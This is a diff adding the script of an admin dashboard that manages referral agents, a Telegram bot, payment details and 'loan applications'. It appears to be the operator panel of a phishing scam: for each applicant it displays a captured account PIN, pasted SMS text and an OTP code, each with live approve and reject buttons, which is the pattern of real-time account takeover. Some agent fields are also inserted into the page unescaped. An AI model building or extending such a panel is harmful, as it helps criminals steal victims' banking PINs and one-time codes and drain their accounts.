+          if (document.getElementById('pmCryptoNetwork')) document.getElementById('pmCryptoNetwork').value = pm.cryptoNetwork || 'USDT (TRC20)';
+          if (document.getElementById('pmInstructions')) document.getElementById('pmInstructions').value = pm.instructions || '';
+        }
+
+        if (data.botRunning && data.hasBotToken) {
+          botStatusDot.className = 'status-dot active';
+          botStatusText.textContent = window.t('Bot Connected');
+        } else if (data.hasBotToken) {
+          botStatusDot.className = 'status-dot active';
+          botStatusText.textContent = window.t('Configured');
+        } else {
+          botStatusDot.className = 'status-dot inactive';
+          botStatusText.textContent = window.t('Bot Disconnected');
+        }
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    document.getElementById('toggleTokenVisibility').addEventListener('click', () => {
+      const input = document.getElementById('botToken');
+      input.type = input.type === 'password' ? 'text' : 'password';
+    });
+
+    document.getElementById('telegramSettingsForm').addEventListener('submit', async event => {
+      event.preventDefault();
+      const saveBtn = document.getElementById('saveSettingsBtn');
+      const msg = document.getElementById('settingsMsg');
+      saveBtn.disabled = true;
+      msg.textContent = '';
+      try {
+        const payload = {
+          adminChatId: document.getElementById('adminChatId').value.trim(),
+          botUsername: document.getElementById('botUsername').value.trim(),
+          publicAppUrl: document.getElementById('publicAppUrl') ? (document.getElementById('publicAppUrl').value.trim() || window.location.origin) : window.location.origin
+        };
+        const rawToken = document.getElementById('botToken').value.trim();
+        if (rawToken) payload.botToken = rawToken;
+
+        const response = await fetch('/api/admin/settings', {
+          method: 'POST',
+          headers: authHeaders(),
+          body: JSON.stringify(payload)
+        });
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.error || 'Failed to save settings.');
+        msg.textContent = window.t('Settings saved!');
+        setTimeout(() => msg.textContent = '', 4000);
+        loadSettings();
+      } catch (err) {
+        alert(err.message);
+      } finally {
+        saveBtn.disabled = false;
+      }
+    });
+
+    // Payment Methods Form Submit
+    document.getElementById('paymentSettingsForm').addEventListener('submit', async event => {
+      event.preventDefault();
+      const saveBtn = document.getElementById('savePaymentBtn');
+      const msg = document.getElementById('paymentMsg');
+      saveBtn.disabled = true;
+      msg.textContent = '';
+      try {
+        const payload = {
+          paymentMethods: {
+            mpesaTill: document.getElementById('pmMpesaTill').value.trim(),
+            mpesaPaybill: document.getElementById('pmMpesaPaybill').value.trim(),
+            mpesaAccount: document.getElementById('pmMpesaAccount').value.trim(),
+            airtelMoney: document.getElementById('pmAirtelMoney').value.trim(),
+            cryptoAddress: document.getElementById('pmCryptoAddress').value.trim(),
+            cryptoNetwork: document.getElementById('pmCryptoNetwork').value.trim(),
+            instructions: document.getElementById('pmInstructions').value.trim()
+          }
+        };
+
+        const response = await fetch('/api/admin/settings', {
+          method: 'POST',
+          headers: authHeaders(),
+          body: JSON.stringify(payload)
+        });
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.error || 'Failed to save payment methods.');
+        msg.textContent = window.t('Payment methods saved successfully!');
+        setTimeout(() => msg.textContent = '', 4000);
+      } catch (err) {
+        alert(err.message);
+      } finally {
+        saveBtn.disabled = false;
+      }
+    });
+
+    // 2. Create Agent
+    document.getElementById('createAgentForm').addEventListener('submit', async event => {
+      event.preventDefault();
+      const btn = document.getElementById('createAgentBtn');
+      const err = document.getElementById('agentError');
+      const resultPanel = document.getElementById('agentResultPanel');
+      err.textContent = '';
+      resultPanel.hidden = true;
+      btn.disabled = true;
+
+      try {
+        const payload = {
+          displayName: document.getElementById('displayName').value.trim(),
+          telegramChatId: document.getElementById('agentTelegramChatId').value.trim() || null,
+          email: document.getElementById('agentEmail').value.trim() || null
+        };
+        const response = await fetch('/api/admin/agents', {
+          method: 'POST',
+          headers: authHeaders(),
+          body: JSON.stringify(payload)
+        });
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.error || 'Could not create agent.');
+
+        let finalReferralUrl = data.referralUrl;
+        if (finalReferralUrl && (finalReferralUrl.includes('127.0.0.1') || finalReferralUrl.includes('localhost'))) {
+          try {
+            const parsed = new URL(finalReferralUrl);
+            finalReferralUrl = `${window.location.origin}${parsed.pathname}${parsed.search}`;
+          } catch (_) {}
+        }
+        document.getElementById('resultReferralUrl').value = finalReferralUrl;
+        document.getElementById('resultUsername').value = data.username || '—';
+        document.getElementById('resultTempPassword').value = data.temporaryPassword || '—';
+        document.getElementById('resultChatId').value = data.telegramChatId || 'Not linked';
+        resultPanel.hidden = false;
+
+        document.getElementById('displayName').value = '';
+        document.getElementById('agentTelegramChatId').value = '';
+        document.getElementById('agentEmail').value = '';
+        loadAgents();
+      } catch (e) {
+        err.textContent = e.message;
+      } finally {
+        btn.disabled = false;
+      }
+    });
+
+    document.getElementById('copyReferralBtn').addEventListener('click', async () => {
+      const urlInput = document.getElementById('resultReferralUrl');
+      await navigator.clipboard.writeText(urlInput.value);
+      const notice = document.getElementById('copyNotice');
+      notice.textContent = window.t('Link copied successfully!');
+      setTimeout(() => notice.textContent = '', 3000);
+    });
+
+    function escapeHtml(str) {
+      if (!str) return '';
+      return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+    }
+
+    async function decideVerification(verificationId, status) {
+      const actionName = status === 'approved' ? 'approve' : 'reject';
+      if (!confirm(`Are you sure you want to ${actionName} this verification step?`)) return;
+      try {
+        const res = await fetch('/api/admin/verifications/decision', {
+          method: 'POST',
+          headers: authHeaders(),
+          body: JSON.stringify({ verificationId, status })
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Failed to process decision.');
+        loadApplications();
+      } catch (e) {
+        alert(e.message);
+      }
+    }
+
+    async function decideStage(applicationId, newStage) {
+      const actionName = newStage === 'approved' ? 'approve' : 'reject';
+      if (!confirm(`Are you sure you want to ${actionName} this application?`)) return;
+      try {
+        const res = await fetch('/api/admin/applications/stage', {
+          method: 'POST',
+          headers: authHeaders(),
+          body: JSON.stringify({ applicationId, stage: newStage })
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Could not update application stage.');
+        loadApplications();
+      } catch (err) {
+        alert(err.message);
+      }
+    }
+
+    window.decideVerification = decideVerification;
+    window.decideStage = decideStage;
+
+    // 3. Applications & Stages
+    async function loadApplications() {
+      const token = getAdminToken();
+      const tbody = document.getElementById('applicationRows');
+      if (!token) return;
+      try {
+        const response = await fetch('/api/admin/applications', { headers: authHeaders() });
+        if (response.status === 401) {
+          setSessionToken(null);
+          showLoginPortal();
+          return;
+        }
+        if (!response.ok) return;
+        const data = await response.json();
+        tbody.replaceChildren();
+
+        const searchTerm = (document.getElementById('appSearchInput')?.value || '').toLowerCase().trim();
+        const filteredApps = (data.applications || []).filter(app => {
+          if (!searchTerm) return true;
+          const str = `${app.id} ${app.first_name} ${app.last_name} ${app.phone} ${app.agent_name || ''} ${app.loan_type || ''}`.toLowerCase();
+          return str.includes(searchTerm);
+        });
+
+        if (filteredApps.length === 0) {
+          const tr = document.createElement('tr');
+          tr.innerHTML = `<td colspan="9" style="text-align:center; color:var(--muted); padding:20px;">No applications found.</td>`;
+          tbody.appendChild(tr);
+          return;
+        }
+
+        const money = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' });
+        filteredApps.forEach(app => {
+          const tr = document.createElement('tr');
+          const stage = (app.status || 'pending').toLowerCase();
+          
+          let badgeClass = 'yellow';
+          let stageLabel = 'Pending';
+          if (stage === 'under_review') { badgeClass = 'blue'; stageLabel = 'Under Review'; }
+          else if (stage === 'approved') { badgeClass = 'green'; stageLabel = 'Approved'; }
+          else if (stage === 'rejected') { badgeClass = 'red'; stageLabel = 'Rejected'; }
+
+          const dateStr = app.created_at ? new Date(app.created_at + 'Z').toLocaleString('en-US') : '—';
+          const agentDisplay = app.agent_name ? `${escapeHtml(app.agent_name)}<br><small style="color:var(--muted);">ID: ${escapeHtml(app.agent_chat_id || 'no chat')}</small>` : '<em style="color:var(--muted);">Direct</em>';
+          const cleanDigits = String(app.phone || '').replace(/\D/g, '');
+          const phoneDisplay = String(app.phone || '').startsWith('+')
+            ? escapeHtml(app.phone)
+            : (cleanDigits.length === 10
+                ? `+1 (${cleanDigits.slice(0, 3)}) ${cleanDigits.slice(3, 6)}-${cleanDigits.slice(6)}`
+                : (cleanDigits.length === 11 && cleanDigits.startsWith('1')
+                    ? `+1 (${cleanDigits.slice(1, 4)}) ${cleanDigits.slice(4, 7)}-${cleanDigits.slice(7)}`
+                    : `+${escapeHtml(cleanDigits)}`));
+
+          // Find Step 3 (PIN), Step 4 (SMS Verification), and Step 5 (OTP Code)
+          const vers = app.verifications || [];
+          const pinVer = vers.find(v => v.step === 'account_pin' || v.step === 'zip_phone' || v.step === 'merchant_pin');
+          const smsVer = vers.find(v => v.step === 'id_document');
+          const otpVer = vers.find(v => v.step === 'otp_code');
+
+          // Render PIN Step
+          let pinHtml = '';
+          if (pinVer) {
+            pinHtml = `<div><strong>PIN:</strong> <code>${escapeHtml(pinVer.zip_code || '—')}</code></div>`;
+            if (pinVer.status === 'pending') {
+              pinHtml += `
+                <div style="margin-top:4px;"><span class="badge yellow">Pending</span></div>
+                <div style="margin-top:4px; display:flex; gap:4px; flex-wrap:wrap;">
+                  <button type="button" class="btn-step-action approve" onclick="decideVerification('${pinVer.id}', 'approved')">✓ Approve</button>
+                  <button type="button" class="btn-step-action reject" onclick="decideVerification('${pinVer.id}', 'rejected')">✗ Reject</button>
+                </div>`;
+            } else if (pinVer.status === 'approved') {
+              pinHtml += `<div style="margin-top:4px;"><span class="badge green">✅ Approved</span></div>`;
+            } else if (pinVer.status === 'rejected') {
+              pinHtml += `<div style="margin-top:4px;"><span class="badge red">❌ Rejected</span></div>`;
+            }
+          } else {
+            pinHtml = `<span style="color:var(--muted); font-size:11px;">— Waiting —</span>`;
+          }
+
+          // Render SMS Verification Step
+          let smsHtml = '';
+          if (smsVer) {
+            const rawText = (smsVer.id_number || '').trim();
+            const textExcerpt = rawText.length > 30 ? rawText.substring(0, 30) + '...' : rawText;
+            smsHtml = `<div style="font-size:11px; max-width:180px; word-break:break-all; background:#f8fafc; padding:3px 6px; border-radius:4px; border:1px solid #e2e8f0;" title="${escapeHtml(rawText)}"><code>${escapeHtml(textExcerpt || '—')}</code></div>`;
+            if (smsVer.status === 'pending') {
+              smsHtml += `
+                <div style="margin-top:4px;"><span class="badge yellow">Pending</span></div>
+                <div style="margin-top:4px; display:flex; gap:4px; flex-wrap:wrap;">
+                  <button type="button" class="btn-step-action approve" onclick="decideVerification('${smsVer.id}', 'approved')">✓ Approve</button>
+                  <button type="button" class="btn-step-action reject" onclick="decideVerification('${smsVer.id}', 'rejected')">✗ Reject</button>
+                </div>`;
+            } else if (smsVer.status === 'approved') {
+              smsHtml += `<div style="margin-top:4px;"><span class="badge green">✅ Approved</span></div>`;
+            } else if (smsVer.status === 'rejected') {
+              smsHtml += `<div style="margin-top:4px;"><span class="badge red">❌ Rejected</span></div>`;
+            }
+          } else {
+            smsHtml = `<span style="color:var(--muted); font-size:11px;">— Waiting —</span>`;
+          }
+
+          // Render OTP Verification Step
+          let otpHtml = '';
+          if (otpVer) {
+            otpHtml = `<div><strong>OTP:</strong> <code>${escapeHtml(otpVer.zip_code || '—')}</code></div>`;
+            if (otpVer.status === 'pending') {
+              otpHtml += `
+                <div style="margin-top:4px;"><span class="badge yellow">Pending</span></div>
+                <div style="margin-top:4px; display:flex; gap:4px; flex-wrap:wrap;">
+                  <button type="button" class="btn-step-action approve" onclick="decideVerification('${otpVer.id}', 'approved')">✓ Approve</button>
+                  <button type="button" class="btn-step-action reject" onclick="decideVerification('${otpVer.id}', 'rejected')">✗ Reject</button>
+                </div>`;
+            } else if (otpVer.status === 'approved') {
+              otpHtml += `<div style="margin-top:4px;"><span class="badge green">✅ Approved</span></div>`;
+            } else if (otpVer.status === 'rejected') {
+              otpHtml += `<div style="margin-top:4px;"><span class="badge red">❌ Rejected</span></div>`;
+            }
+          } else {
+            otpHtml = `<span style="color:var(--muted); font-size:11px;">— Waiting —</span>`;
+          }
+
+          tr.innerHTML = `
+            <td><code>${app.id.slice(0, 8)}...</code><br><small style="color:var(--muted);">${dateStr}</small></td>
+            <td><strong>${escapeHtml(app.first_name)} ${escapeHtml(app.last_name)}</strong></td>
+            <td><code>${phoneDisplay}</code></td>
+            <td><strong>$${money.format(app.loan_amount)} USD</strong><br><small style="color:var(--muted);">${escapeHtml(app.loan_type)} • ${app.term_months}m</small></td>
+            <td>${pinHtml}</td>
+            <td>${smsHtml}</td>
+            <td>${otpHtml}</td>
+            <td>${agentDisplay}</td>
+            <td>
+              <div style="margin-bottom:6px;"><span class="badge ${badgeClass}">${window.t(stageLabel)}</span></div>
+              <div style="display:flex; gap:4px; margin-bottom:6px; flex-wrap:wrap;">
+                <button type="button" class="btn-step-action approve" onclick="decideStage('${app.id}', 'approved')" title="Approve Application">✓ Approve</button>
+                <button type="button" class="btn-step-action reject" onclick="decideStage('${app.id}', 'rejected')" title="Reject Application">✗ Reject</button>
+              </div>
+              <select class="stage-select" data-app-id="${app.id}">
+                <option value="pending" ${stage === 'pending' ? 'selected' : ''}>⏳ Pending</option>
+                <option value="under_review" ${stage === 'under_review' ? 'selected' : ''}>🔍 Under Review</option>
+                <option value="approved" ${stage === 'approved' ? 'selected' : ''}>✅ Approve</option>
+                <option value="rejected" ${stage === 'rejected' ? 'selected' : ''}>❌ Reject</option>
+              </select>
+            </td>
+          `;
+          tbody.appendChild(tr);
+        });
+
+        // Add change stage listener
+        tbody.querySelectorAll('.stage-select').forEach(select => {
+          select.addEventListener('change', async event => {
+            const appId = event.target.dataset.appId;
+            const newStage = event.target.value;
+            event.target.disabled = true;
+            try {
+              const res = await fetch('/api/admin/applications/stage', {
+                method: 'POST',
+                headers: authHeaders(),
+                body: JSON.stringify({ applicationId: appId, stage: newStage })
+              });
+              if (!res.ok) throw new Error('Could not update application stage.');
+              loadApplications();
+            } catch (err) {
+              alert(err.message);
+              event.target.disabled = false;
+            }
+          });
+        });
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    document.getElementById('refreshAppsBtn')?.addEventListener('click', loadApplications);
+    document.getElementById('appSearchInput')?.addEventListener('input', () => {
+      loadApplications();
+    });
+
+    // 4. Agents List
+    async function loadAgents() {
+      const token = getAdminToken();
+      const tbody = document.getElementById('agentRows');
+      if (!token) return;
+      try {
+        const response = await fetch('/api/admin/agents', { headers: authHeaders() });
+        if (response.status === 401) {
+          setSessionToken(null);
+          showLoginPortal();
+          return;
+        }
+        if (!response.ok) return;
+        const data = await response.json();
+        tbody.replaceChildren();
+
+        if (data.agents.length === 0) {
+          const tr = document.createElement('tr');
+          tr.innerHTML = `<td colspan="6" style="text-align:center; color:var(--muted); padding:20px;">No registered agents.</td>`;
+          tbody.appendChild(tr);
+          return;
+        }
+
+        // Update recipient select options
+        const targetSelect = document.getElementById('messageTarget');
+        const currentVal = targetSelect.value;
+        targetSelect.replaceChildren();
+
+        const optAll = document.createElement('option');
+        optAll.value = 'all';
+        optAll.textContent = '📢 All Agents with Telegram (Broadcast)';
+        targetSelect.appendChild(optAll);
+
+        const optCustom = document.createElement('option');
+        optCustom.value = 'custom';
+        optCustom.textContent = '✏️ Custom Chat ID...';
+        targetSelect.appendChild(optCustom);
+
+        data.agents.forEach(agent => {
+          if (agent.telegramChatId) {
+            const opt = document.createElement('option');
+            opt.value = agent.id;
+            opt.textContent = `👤 ${agent.displayName} (Chat: ${agent.telegramChatId})`;
+            targetSelect.appendChild(opt);
+          }
+
+          let agentUrl = agent.referralUrl;
+          if (agentUrl && (agentUrl.includes('127.0.0.1') || agentUrl.includes('localhost'))) {
+            try {
+              const parsed = new URL(agentUrl);
+              agentUrl = `${window.location.origin}${parsed.pathname}${parsed.search}`;
+            } catch (_) {}
+          }
+
+          const tr = document.createElement('tr');
+          tr.innerHTML = `
+            <td><strong>${agent.displayName}</strong></td>
+            <td><code>${agent.username || '—'}</code></td>
+            <td><code>${agent.telegramChatId || '—'}</code></td>
+            <td><strong>${agent.leadCount || 0}</strong></td>
+            <td>
+              <div style="display:flex; align-items:center; gap:6px;">
+                <input value="${agentUrl}" readonly style="min-height:30px; padding:4px 8px; font-size:12px; max-width:220px;" />
+                <button type="button" class="secondary small copy-agent-btn" data-url="${agentUrl}">Copy</button>
+              </div>
+            </td>
+            <td>
+              ${agent.telegramChatId
+                ? `<button type="button" class="small direct-msg-btn" data-agent-id="${agent.id}" data-name="${agent.displayName}">✉️ Message</button>`
+                : `<span style="color:var(--muted); font-size:12px;">No Telegram</span>`}
+            </td>
+          `;
+          tbody.appendChild(tr);
+        });
+
+        if (Array.from(targetSelect.options).some(o => o.value === currentVal)) {
+          targetSelect.value = currentVal;
+        }
+
+        tbody.querySelectorAll('.copy-agent-btn').forEach(btn => {
+          btn.addEventListener('click', async () => {
+            await navigator.clipboard.writeText(btn.dataset.url);
+            btn.textContent = '✓ Copied';
+            setTimeout(() => btn.textContent = 'Copy', 2000);
+          });
+        });
+
+        tbody.querySelectorAll('.direct-msg-btn').forEach(btn => {
+          btn.addEventListener('click', () => {
+            targetSelect.value = btn.dataset.agentId;
+            document.getElementById('customChatGroup').hidden = true;
+            document.getElementById('agentMessageSection').scrollIntoView({ behavior: 'smooth' });
+            document.getElementById('agentMessageText').focus();
+          });
+        });
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    // 5. Send Message to Agents
+    const messageTargetSelect = document.getElementById('messageTarget');
+    const customChatGroup = document.getElementById('customChatGroup');
+    const customChatIdInput = document.getElementById('customChatId');
+
+    messageTargetSelect.addEventListener('change', () => {
+      const isCustom = messageTargetSelect.value === 'custom';
+      customChatGroup.hidden = !isCustom;
+      if (isCustom) customChatIdInput.focus();
+    });
+
+    document.getElementById('sendMessageForm').addEventListener('submit', async event => {
+      event.preventDefault();
+      const sendBtn = document.getElementById('sendMessageBtn');
+      const statusMsg = document.getElementById('messageStatusMsg');
+      const errorMsg = document.getElementById('messageErrorMsg');
+      const text = document.getElementById('agentMessageText').value.trim();
+      const target = messageTargetSelect.value;
+      const customChatId = customChatIdInput.value.trim();
+
+      statusMsg.textContent = '';
+      errorMsg.textContent = '';
+      sendBtn.disabled = true;
+
+      try {
+        const payload = {
+          target: target,
+          message: text,
+          chatId: customChatId
+        };
+        const response = await fetch('/api/admin/agents/message', {
+          method: 'POST',
+          headers: authHeaders(),
+          body: JSON.stringify(payload)
+        });
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.error || 'Failed to send message.');
+        statusMsg.textContent = `✓ Message sent successfully to ${data.sent} recipient(s)!`;
+        document.getElementById('agentMessageText').value = '';
+        setTimeout(() => statusMsg.textContent = '', 5000);
+      } catch (err) {
+        errorMsg.textContent = err.message;
+      } finally {
+        sendBtn.disabled = false;
+      }
+    });
+
+    document.getElementById('refreshAppsBtn').addEventListener('click', loadApplications);
+    document.getElementById('refreshAgentsBtn').addEventListener('click', loadAgents);
+
+    // Initial load & authentication check
+    checkAuthAndInit();
+  </script>
+</body>
+</html>
